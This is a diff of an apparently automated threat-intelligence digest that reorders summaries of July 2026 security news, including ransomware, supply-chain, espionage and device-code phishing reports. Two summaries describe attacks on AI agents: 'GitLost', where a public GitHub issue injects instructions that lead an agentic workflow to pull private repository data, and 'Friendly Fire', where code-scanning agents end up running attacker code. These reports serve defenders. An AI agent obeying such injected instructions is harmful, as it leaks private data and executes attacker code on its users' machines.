different managed service providers, different parts of the country—that were so mechanically similar that by the latest case we could predict the next artifact before we pulled the log that contained it. We knew the account name the operator would create. We knew the service they'd abuse. We even knew the workstation name we'd find leaking through a printer mapping, because it was the same workstation name every single time. Figure 1: Predictability and clustered behavior often presents the smoking gun for initial access. Cybersecurity company Sophos has additionally tracked the cluster we've observed as STAC3725 , echoing various analyses that we've presented in this article, and serves as an excellent va
-```
-
-#### Corroborating sources (1)
-
-- **Huntress** (detection_response_operations)
-  - Title: CitrixBleed 2 (CVE-2025-5777) 7Steps to Dragonforce Ransomware | Huntress
-  - Published: 2026-07-09T14:00:00+00:00
-  - Link: https://www.huntress.com/blog/citrixbleed-2-dragonforce-ransomware
-  - Summary: Huntress has observed a series of strikingly similar intrusions beginning with CitrixBleed 2 exploitation, employing novel local privilege escalation techniques, and ending in Dragonforce ransomware.
 
 ### Cluster 2fab803c60 — score 16
 
@@ -1385,14 +1396,9 @@ Cyber Risk Data Privacy Threat Intelligence Vulnerabilities & Threats News 'GitL
   - Published: 2026-07-07T15:24:30+00:00
   - Link: https://www.darkreading.com/cyber-risk/gitlost-leaks-private-data-github-agentic-workflows
   - Summary: The flaw allows an unauthenticated attacker to craft a GitHub Issue in an org's public repository and then silently pull data from its private repos, too.
-- **SecurityWeek** (cyber_news_breach_reporting)
-  - Title: Network of 200 GitHub Repositories Used for Malware Infection
-  - Published: 2026-07-10T08:00:14+00:00
-  - Link: https://www.securityweek.com/network-of-200-github-repositories-used-for-malware-infection/
-  - Summary: A Go module is used to load PowerShell code that fetches a resolver from public dead drops to execute Windows malware. The post Network of 200 GitHub Repositories Used for Malware Infection appeared first on SecurityWeek .
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: Injective Labs GitHub Compromise Pushes Wallet-Key-Stealing npm Packages
-  - Published: 2026-07-10T17:29:28+00:00
+  - Published: 2026-07-10T16:29:00+00:00
   - Link: https://thehackernews.com/2026/07/injective-labs-github-compromise-pushes.html
   - Summary: Unknown threat actors compromised the Injective Labs SDK project's GitHub repository and leveraged it to publish a malicious package on the npm registry to steal cryptocurrency wallet private keys and mnemonic seed phrases. The compromised version, @injectivelabs/sdk-ts@1.20.21, came embedded with fake telemetry functionality that exfiltrated data from cryptocurrency wallets. The version was
 - **Reddit r/netsec** (reddit_practitioner_osint)
@@ -1400,6 +1406,11 @@ Cyber Risk Data Privacy Threat Intelligence Vulnerabilities & Threats News 'GitL
   - Published: 2026-07-07T15:16:22+00:00
   - Link: https://www.reddit.com/r/netsec/comments/1upy3gm/gitlost_a_public_github_issue_can_steer_an_orgs/
   - Summary: Noma Security published a technique they call GitLost against GitHub Agentic Workflows (the plain-English-Markdown agent feature GitHub put into public preview in February, runnable on Copilot, Claude, Gemini, or Codex). Worth reading because it is a clean demonstration of why "filter the injection" does not hold as a defense. The setup. Workflows are read-only by default, but an org can hand one a personal access token with read access across its repos, private ones included, to give the agent cross-repo context. That grant is the whole vulnerability. Nothing else about the attack requires access: no stolen creds, no write access to anything private, no touching a server. The attacker just opens a normal-looking issue on a public repo. The technique is indirect prompt injection, which is not new, but the interesting part is what the agent controls. Noma's Sasi Levi frames the distinction as earlier injection being about manipulating what an agent says, versus GitLost being about what
+- **SecurityWeek** (cyber_news_breach_reporting)
+  - Title: Network of 200 GitHub Repositories Used for Malware Infection
+  - Published: 2026-07-10T08:00:14+00:00
+  - Link: https://www.securityweek.com/network-of-200-github-repositories-used-for-malware-infection/
+  - Summary: A Go module is used to load PowerShell code that fetches a resolver from public dead drops to execute Windows malware. The post Network of 200 GitHub Repositories Used for Malware Infection appeared first on SecurityWeek .
 - **BleepingComputer** (cyber_news_breach_reporting)
   - Title: Injective SDK on npm infected with cryptocurrency wallet stealer
   - Published: 2026-07-09T20:10:00+00:00
@@ -1632,6 +1643,49 @@ AWS Security Blog Enforce zero data retention on Amazon Bedrock with Bedrock Pro
   - Link: https://thehackernews.com/2026/07/friendly-fire-ai-agents-built-to-catch.html
   - Summary: Ask an AI coding agent to scan open-source code for security holes, and it might run the attacker's code on your own machine instead. That is the finding in a proof-of-concept published Wednesday by the AI Now Institute, an attack it calls "Friendly Fire." It works against Anthropic's Claude Code and OpenAI's Codex when either is running in an autonomous mode that approves its own
 
+### Cluster 4a0789d0ad — score 10
+
+- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+- Source: SentinelOne Labs (threat_research_primary)
+- Published: 2026-07-09T12:55:00+00:00
+- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
+```
+
+#### Full body
+
+```
+Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
+```
+
+#### Corroborating sources (1)
+
+- **SentinelOne Labs** (threat_research_primary)
+  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+  - Published: 2026-07-09T12:55:00+00:00
+  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
+
 ### Cluster b835d1d4b1 — score 10
 
 - Title: GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware
@@ -1681,49 +1735,6 @@ Share Link copied to clipboard! Tags Malware Threats intelligence Cyberattacker 
   - Published: 2026-07-09T15:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/07/09/gigawiper-anatomy-of-a-destructive-backdoor-assembled-from-multiple-malware/
   - Summary: GigaWiper is a destructive backdoor that combines multiple wiping and ransomware-like capabilities into a single operational platform. This blog analyzes how the malware incorporates code from several previously separate malware families and provides guidance to help defenders detect and defend against similar threats. The post GigaWiper: Anatomy of a destructive backdoor assembled from multiple malware appeared first on Microsoft Security Blog .
-
-### Cluster 4a0789d0ad — score 10
-
-- Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-- Source: SentinelOne Labs (threat_research_primary)
-- Published: 2026-07-09T12:55:00+00:00
-- Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
-```
-
-#### Full body
-
-```
-Adversary One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement Aleksandar Milenkoski & Julian-Ferdinand Vögele / July 9, 2026 Executive Summary SentinelLABS has been tracking sustained cyberespionage activity against several Pakistani law enforcement organizations, taking place from February 2024 to April 2026. All these actors converged on Balochistan Police over this period, bringing both a partner and an adversary of Pakistan to the same police force in a province shaped by a separatist insurgency and the regional tensions it has drawn in. At Balochistan Police, the compromised assets included servers hosting web applications that manage police and citizen data, such as criminal and biometric records. A suspected China-nexus actor planted implants in one of the web applications, which serves both police staff and citizens, weaponizing a tool of Pakistan’s police digitalization against its users. Pakistani law enforcement organizations attract cyber collection because they hold information on Pakistan’s internal security that regional powers have an incentive to pursue. For China, the likely primary concern is the safety of its nationals, the target of repeated deadly attacks Pakistan has failed to prevent, leading Beijing to assess that threat for itself rather than rely on its partner alone. For India, the strongest motive is probably its rivalry with Pakistan, with Balochistan Police offering insight into the security posture of a Pakistani province prominent in wider mutual accusations over cross-border support for militancy. Overview Suspected China- and India-nexus threat actors carried out intrusions into several Pakistani law enforcement organizations between 2024 and 2026. Our analysis of C2 netflow data revealed that suspected China- and India-nexus threat actors operating PlugX, ShadowPad, Cobalt Strike, and Remcos infrastructure have converged on this victim class. All of these threat actors were active against Balochistan Police, the principal police force serving the Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
-```
-
-#### Corroborating sources (1)
-
-- **SentinelOne Labs** (threat_research_primary)
-  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
-  - Published: 2026-07-09T12:55:00+00:00
-  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
-  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
 
 ### Cluster ca7dbcaa1e — score 10
 
@@ -1814,49 +1825,6 @@ UAT-7810 continues building ORB networks using new malware By Jungsoo An , Ashee
   - Published: 2026-07-07T10:00:05+00:00
   - Link: https://blog.talosintelligence.com/uat-7810/
   - Summary: Talos’ latest findings on UAT-7810 indicate that the threat actor continues to develop their custom-made malware.
-
-### Cluster 40eaf074fe — score 10
-
-- Title: When checking the URL isn’t enough: a Device Code Phishing attack via a Microsoft website
-- Source: Kaspersky Securelist (threat_research_primary)
-- Published: 2026-07-06T09:00:43+00:00
-- Link: https://securelist.com/microsoft-device-code-phishing-attack/120350/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: phishing_social_eng
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-The OAuth 2.0 Device Authorization Grant specification was designed to streamline authentication for Smart TVs, IoT devices, and printers. Today, threat actors are weaponizing it.
-```
-
-#### Full body
-
-```
-Table of Contents Core steps of Device Authorization Grant Analysis of a Device Code Phishing attack Adaptation of the attack method How to defend against Device Code Phishing attacks Authors Roman Dedenok One of the most common pieces of anti-phishing advice is to double-check the website’s domain name before providing your credentials. Typically, a fraudulent domain stands out to the trained eye, differing from the official URL by at least a few characters. Recently, however, we encountered a campaign where attackers instruct victims to input data directly into a legitimate, trusted corporate site: the Microsoft Identity Platform , which supports an OAuth 2.0 specification known as the Device Authorization Grant . This specific protocol extension was designed to simplify the login experience for smart TVs, IoT hardware, printers, and other input-constrained devices that lack a full browser or keyboard. It allows users to use a nearby smartphone or PC for authorizing these devices to access their accounts. To complete the process, the user enters a one-time code on a designated authentication page. The Microsoft Identity Platform returns this code along with a link to enter it in response to a request to https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode ; hence, an attack scenario exploiting this mechanism is called Device Code Phishing. In this post, we break down how the Device Authorization Grant specification (also known as the Device Authorization Grant Flow or Device Code Flow) works, analyze real-world attacks leveraging this technology, and outline effective strategies to defend against Device Code Phishing. Core steps of Device Authorization Grant 1. Requesting the authorization code When a user launches an app on a client device, such as a streaming app on a Smart TV, the app detects that it is unauthenticated and sends a POST request to https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode . This request includes the client_id (the unique identifier of the app registered in Microsoft Entra ID / Azure AD) and the scope (the requested access permissions). In response, the application receives several parameters: device_code (a secret code for internal use), user_code (a short code displayed to the end-user), verification_uri (the login URL the user needs to visit), expires_in (the code’s lifespan), and interval (how frequently the app should poll the server). 2. Displaying the code to the user The device displays both the user_code and the verification_uri to the user, instructing them to complete authentication on another device. For instance, a smart TV will display the code and URL — often rendering the verification_uri as a QR code — so the user can access it via their smartphone. 3. Entering the code and confirming access By scanning the QR code with a smartphone camera or manually typing out the address, the user navigates to the verification_uri (such as https://microsoft.com/devicelogin ) and enters the user_code . 4. Polling the server The device (smart TV) begins polling the server to check the authorization status — essentially verifying whether the user has approved the access request. It does this by sending a POST request to the token endpoint: https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token . The request passes the grant_type parameter with the value urn:ietf:params:oauth:grant-type:device_code , indicating the use of the Device Authorization Grant method. This signals to the authorization server exactly which authentication method is being used to request access tokens. The server waits for the user to enter the user_code on their secondary device and approve access to their resources or data. Until that approval happens, the server responds with an error code like authorization_pending (keep waiting) or slow_down (reduce the polling frequency). 5. Issuing access tokens Once the user successfully approves the application’s request, the server responds to the ap
-```
-
-#### Corroborating sources (1)
-
-- **Kaspersky Securelist** (threat_research_primary)
-  - Title: When checking the URL isn’t enough: a Device Code Phishing attack via a Microsoft website
-  - Published: 2026-07-06T09:00:43+00:00
-  - Link: https://securelist.com/microsoft-device-code-phishing-attack/120350/
-  - Summary: The OAuth 2.0 Device Authorization Grant specification was designed to streamline authentication for Smart TVs, IoT devices, and printers. Today, threat actors are weaponizing it.
 
 ### Cluster 3ee1d54d9d — score 10
 
@@ -1954,6 +1922,92 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 6th July �
   - Link: https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
   - Summary: For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found […] The post 6th July – Threat Intelligence Report appeared first on Check Point Research .
 
+### Cluster 40eaf074fe — score 10
+
+- Title: When checking the URL isn’t enough: a Device Code Phishing attack via a Microsoft website
+- Source: Kaspersky Securelist (threat_research_primary)
+- Published: 2026-07-06T09:00:43+00:00
+- Link: https://securelist.com/microsoft-device-code-phishing-attack/120350/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng
+- urgency_signals: preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+The OAuth 2.0 Device Authorization Grant specification was designed to streamline authentication for Smart TVs, IoT devices, and printers. Today, threat actors are weaponizing it.
+```
+
+#### Full body
+
+```
+Table of Contents Core steps of Device Authorization Grant Analysis of a Device Code Phishing attack Adaptation of the attack method How to defend against Device Code Phishing attacks Authors Roman Dedenok One of the most common pieces of anti-phishing advice is to double-check the website’s domain name before providing your credentials. Typically, a fraudulent domain stands out to the trained eye, differing from the official URL by at least a few characters. Recently, however, we encountered a campaign where attackers instruct victims to input data directly into a legitimate, trusted corporate site: the Microsoft Identity Platform , which supports an OAuth 2.0 specification known as the Device Authorization Grant . This specific protocol extension was designed to simplify the login experience for smart TVs, IoT hardware, printers, and other input-constrained devices that lack a full browser or keyboard. It allows users to use a nearby smartphone or PC for authorizing these devices to access their accounts. To complete the process, the user enters a one-time code on a designated authentication page. The Microsoft Identity Platform returns this code along with a link to enter it in response to a request to https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode ; hence, an attack scenario exploiting this mechanism is called Device Code Phishing. In this post, we break down how the Device Authorization Grant specification (also known as the Device Authorization Grant Flow or Device Code Flow) works, analyze real-world attacks leveraging this technology, and outline effective strategies to defend against Device Code Phishing. Core steps of Device Authorization Grant 1. Requesting the authorization code When a user launches an app on a client device, such as a streaming app on a Smart TV, the app detects that it is unauthenticated and sends a POST request to https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode . This request includes the client_id (the unique identifier of the app registered in Microsoft Entra ID / Azure AD) and the scope (the requested access permissions). In response, the application receives several parameters: device_code (a secret code for internal use), user_code (a short code displayed to the end-user), verification_uri (the login URL the user needs to visit), expires_in (the code’s lifespan), and interval (how frequently the app should poll the server). 2. Displaying the code to the user The device displays both the user_code and the verification_uri to the user, instructing them to complete authentication on another device. For instance, a smart TV will display the code and URL — often rendering the verification_uri as a QR code — so the user can access it via their smartphone. 3. Entering the code and confirming access By scanning the QR code with a smartphone camera or manually typing out the address, the user navigates to the verification_uri (such as https://microsoft.com/devicelogin ) and enters the user_code . 4. Polling the server The device (smart TV) begins polling the server to check the authorization status — essentially verifying whether the user has approved the access request. It does this by sending a POST request to the token endpoint: https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token . The request passes the grant_type parameter with the value urn:ietf:params:oauth:grant-type:device_code , indicating the use of the Device Authorization Grant method. This signals to the authorization server exactly which authentication method is being used to request access tokens. The server waits for the user to enter the user_code on their secondary device and approve access to their resources or data. Until that approval happens, the server responds with an error code like authorization_pending (keep waiting) or slow_down (reduce the polling frequency). 5. Issuing access tokens Once the user successfully approves the application’s request, the server responds to the ap
+```
+
+#### Corroborating sources (1)
+
+- **Kaspersky Securelist** (threat_research_primary)
+  - Title: When checking the URL isn’t enough: a Device Code Phishing attack via a Microsoft website
+  - Published: 2026-07-06T09:00:43+00:00
+  - Link: https://securelist.com/microsoft-device-code-phishing-attack/120350/
+  - Summary: The OAuth 2.0 Device Authorization Grant specification was designed to streamline authentication for Smart TVs, IoT devices, and printers. Today, threat actors are weaponizing it.
+
+### Cluster caac5571c6 — score 10
+
+- Title: The Threat Isn’t the Frontier Model
+- Source: Recorded Future (threat_research_primary)
+- Published: 2026-07-08T00:00:00+00:00
+- Link: https://www.recordedfuture.com/blog/build-defensive-ai-agents
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, web_shell_backdoor
+- affected_industries: financial_services, government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage, web_shell_backdoor
+- affected_industries: financial_services, government
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+The real AI threat isn't frontier models. It's cheap local models getting easier to run. Here's why CISOs should build defensive agents now, before attackers scale.
+```
+
+#### Full body
+
+```
+The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vibes: international flights, Riyadh heat, and plentiful CISO conversations. Every conversation (regardless of geographic location or industry vertical) currently begins and ends with AI strategy. Let’s unpack the nuance. Every executive should be contemplating two questions at this moment : Are we building, testing, and scaling agents for the coming onslaught of AI-enabled adversary activity? Do we have the breadth of intelligence necessary to move at machine speed? Why Agents and Why Now? Timing is everything in life. So the question is: why invest in agents for defensive workflows now? Two premises need to be explained here. First, let’s focus on financially motivated adversaries that don’t receive a government paycheck (directly or indirectly). The state-sponsored adversaries have a different set of resources at their disposal. There are controlled cases where Frontier AI models enable autonomous adversarial activity in malware generation or holistic intrusion chains. Even the Five Eyes are officially warning about adversarial use of frontier models. Yet the onslaught of offensive agents hasn’t materialized yet. Like the Uruk-hai attacking Helm’s Deep in The Lord of the Rings , we expect the wave is coming, but the automated army hasn’t arrived. Why not? Frontier models may be susceptible to context poisoning over time, but it’s difficult to use them at any scale for automated offensive operations. The guardrails are sufficient for the moment. Adversaries are also caught between the OPSEC tension of using third-party APIs (which increases attribution risk) and investing the resources to build local open-source models. While much has been made of open-source model capabilities, the reality is that time, effort, and financial resources are required to use them effectively for offensive campaigns. To get nerdy for a second (because the details are important), a recent experiment with LibreChat and Dolphin-llama3:14b (uncensored LLM) on a $3K local server (containing a reasonable Nvidia GPU with 16GB of VRAM ) revealed that simple tasks like coding a new web shell are still out of reach. The level of effort and hardware required to build a local resource capable of orchestrating effective autonomous attack agents will only decrease over time. Quantization is the clock defenders should be watching. A reductive quantization explanation in this AI context is using less memory by rounding billions of numbers (weights) rather than maintaining precision, thereby shrinking an AI model’s size. Even though the model is slightly less capable, it’s still useful for most tasks. Quantization drives the hardware bar down, and the lower that bar falls, the sooner opportunistic actors can execute attacks at scale. The danger for defenders isn’t the headline-grabbing frontier models; it’s the ease with which adversaries can deploy effective local models on modest hardware. Based on the previous 18 months of advances , the next 6-12 months will likely yield similar advances in open-source model capabilities with minimal hardware investment. That’s when opportunistic actors start staging at scale. Which brings us back to protecting the proverbial house with defensive AI agents. Now is the time to build , not ponder. We don’t jump into self-driving cars until we have some confidence that the edge cases have been worked out. Similarly, the agentic workflow edge cases can’t be discovered and solved without iteration and testing. Smart CISOs are building an AI control plane (in collaboration with adjacent business units) to enable transparency into AI token consumption, project ROI visibility, and code security . Building and testing agents is part of a larger control-plane project and is particularly time-sensitive. Sandwiched between data availability and information security regulations, CISOs need to generate trust and confidence in agents. Humans may stay in the decision l
+```
+
+#### Corroborating sources (1)
+
+- **Recorded Future** (threat_research_primary)
+  - Title: The Threat Isn’t the Frontier Model
+  - Published: 2026-07-08T00:00:00+00:00
+  - Link: https://www.recordedfuture.com/blog/build-defensive-ai-agents
+  - Summary: The real AI threat isn't frontier models. It's cheap local models getting easier to run. Here's why CISOs should build defensive agents now, before attackers scale.
+
 ### Cluster 9814bfc594 — score 10
 
 - Title: Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management
@@ -2036,56 +2090,13 @@ How NodeZero® Rapid Response Helps Operationalize BOD 26-04 Tim Jones July 6, 2
   - Link: https://horizon3.ai/intelligence/blogs/nodezero-rapid-response-bod-26-04/
   - Summary: CISA BOD 26-04 shifts federal vulnerability management toward risk-based prioritization. Learn how NodeZero® Rapid Response helps agencies validate exploitability, prioritize remediation, and verify fixes.
 
-### Cluster caac5571c6 — score 10
-
-- Title: The Threat Isn’t the Frontier Model
-- Source: Recorded Future (threat_research_primary)
-- Published: 2026-07-08T00:00:00+00:00
-- Link: https://www.recordedfuture.com/blog/build-defensive-ai-agents
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, web_shell_backdoor
-- affected_industries: financial_services, government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage, web_shell_backdoor
-- affected_industries: financial_services, government
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-The real AI threat isn't frontier models. It's cheap local models getting easier to run. Here's why CISOs should build defensive agents now, before attackers scale.
-```
-
-#### Full body
-
-```
-The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vibes: international flights, Riyadh heat, and plentiful CISO conversations. Every conversation (regardless of geographic location or industry vertical) currently begins and ends with AI strategy. Let’s unpack the nuance. Every executive should be contemplating two questions at this moment : Are we building, testing, and scaling agents for the coming onslaught of AI-enabled adversary activity? Do we have the breadth of intelligence necessary to move at machine speed? Why Agents and Why Now? Timing is everything in life. So the question is: why invest in agents for defensive workflows now? Two premises need to be explained here. First, let’s focus on financially motivated adversaries that don’t receive a government paycheck (directly or indirectly). The state-sponsored adversaries have a different set of resources at their disposal. There are controlled cases where Frontier AI models enable autonomous adversarial activity in malware generation or holistic intrusion chains. Even the Five Eyes are officially warning about adversarial use of frontier models. Yet the onslaught of offensive agents hasn’t materialized yet. Like the Uruk-hai attacking Helm’s Deep in The Lord of the Rings , we expect the wave is coming, but the automated army hasn’t arrived. Why not? Frontier models may be susceptible to context poisoning over time, but it’s difficult to use them at any scale for automated offensive operations. The guardrails are sufficient for the moment. Adversaries are also caught between the OPSEC tension of using third-party APIs (which increases attribution risk) and investing the resources to build local open-source models. While much has been made of open-source model capabilities, the reality is that time, effort, and financial resources are required to use them effectively for offensive campaigns. To get nerdy for a second (because the details are important), a recent experiment with LibreChat and Dolphin-llama3:14b (uncensored LLM) on a $3K local server (containing a reasonable Nvidia GPU with 16GB of VRAM ) revealed that simple tasks like coding a new web shell are still out of reach. The level of effort and hardware required to build a local resource capable of orchestrating effective autonomous attack agents will only decrease over time. Quantization is the clock defenders should be watching. A reductive quantization explanation in this AI context is using less memory by rounding billions of numbers (weights) rather than maintaining precision, thereby shrinking an AI model’s size. Even though the model is slightly less capable, it’s still useful for most tasks. Quantization drives the hardware bar down, and the lower that bar falls, the sooner opportunistic actors can execute attacks at scale. The danger for defenders isn’t the headline-grabbing frontier models; it’s the ease with which adversaries can deploy effective local models on modest hardware. Based on the previous 18 months of advances , the next 6-12 months will likely yield similar advances in open-source model capabilities with minimal hardware investment. That’s when opportunistic actors start staging at scale. Which brings us back to protecting the proverbial house with defensive AI agents. Now is the time to build , not ponder. We don’t jump into self-driving cars until we have some confidence that the edge cases have been worked out. Similarly, the agentic workflow edge cases can’t be discovered and solved without iteration and testing. Smart CISOs are building an AI control plane (in collaboration with adjacent business units) to enable transparency into AI token consumption, project ROI visibility, and code security . Building and testing agents is part of a larger control-plane project and is particularly time-sensitive. Sandwiched between data availability and information security regulations, CISOs need to generate trust and confidence in agents. Humans may stay in the decision l
-```
-
-#### Corroborating sources (1)
-
-- **Recorded Future** (threat_research_primary)
-  - Title: The Threat Isn’t the Frontier Model
-  - Published: 2026-07-08T00:00:00+00:00
-  - Link: https://www.recordedfuture.com/blog/build-defensive-ai-agents
-  - Summary: The real AI threat isn't frontier models. It's cheap local models getting easier to run. Here's why CISOs should build defensive agents now, before attackers scale.
-
 ### Cluster 0514a6908e — score 10
 
 - Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-07-07T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52618
-- Fetch status: fetch_failed:HTTPError
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
@@ -2102,6 +2113,12 @@ The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vib
 
 ```
 iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+```
+
+#### Full body
+
+```
